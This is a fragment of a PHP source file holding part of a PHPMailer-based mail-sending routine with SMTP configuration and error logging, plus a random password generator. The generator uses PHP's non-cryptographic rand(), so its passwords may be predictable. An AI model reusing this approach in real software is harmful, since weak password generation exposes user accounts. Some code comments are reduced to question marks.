                $mailer->AddAddress( $valto['mail'], $valto['name'] );
            } else
            $mailer->AddAddress( $to['mail'], $to['name'] );
        if( $body_html ){
            $mailer->MsgHTML( $body_html );
            $mailer->AltBody = $body;
        } else $mailer->Body = $body;
        $mailer->CharSet = DEFAULT_CHARSET;
        if( $image )
            $mailer->AddEmbeddedImage( $image['file'], $image['cid'], "", "base64", "image/jpg" );
        $mailer->SMTPDebug = 0;
        if( CONF_SMTP ){
            $mailer->Host = CONF_SMTP_HOST;
            $mailer->Port = CONF_SMTP_Port;
            $mailer->IsSMTP();
            if( trim( CONF_SMTP_User ) ){
                $mailer->SMTPAuth = true;
                $mailer->Username = CONF_SMTP_User; // SMTP account username
                $mailer->Password = CONF_SMTP_Pass;
            }
        }
        if( !$mailer->Send() ){
            $f = fopen( ROOT_DIR . "/cfg/error.log", "a" );
            $time = date( "d.m.y H:i" );
            fputs( $f, "[$time] Error: " . $mailer->ErrorInfo . "\r\n" );
            fclose( $f );
        }
        $mailer->ClearAddresses();
        $mailer->ClearAttachments();

    }

    function generate_password( $number ){
        $arr = array( 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'V', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', ',', '(', ')', '[', ']', '!', '?', '&', '^', '%', '@', '*', '$', '<', '>', '/', '|', '+', '-', '{', '}', '`', '~' );
        // h??????
        $pass = "";
        for( $i = 0; $i < $number; $i++ ){
            // u????????????
            $index = rand( 0, count( $arr ) - 1 );
            $pass .= $arr[$index];
        }
        return $pass;
    }

?>
